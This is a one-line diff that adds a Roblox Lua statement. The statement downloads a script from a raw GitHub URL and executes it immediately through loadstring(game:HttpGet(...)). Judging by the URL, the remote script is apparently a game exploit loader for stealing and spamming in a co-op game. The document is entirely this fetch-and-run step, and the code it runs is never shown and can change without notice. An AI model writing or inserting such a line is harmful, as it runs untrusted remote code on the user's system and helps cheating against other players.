@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Docktuangular/loaders/main/loaders/plant-steal-co-op-spam7-8xpyxxlbjn7g9i.lua"))()
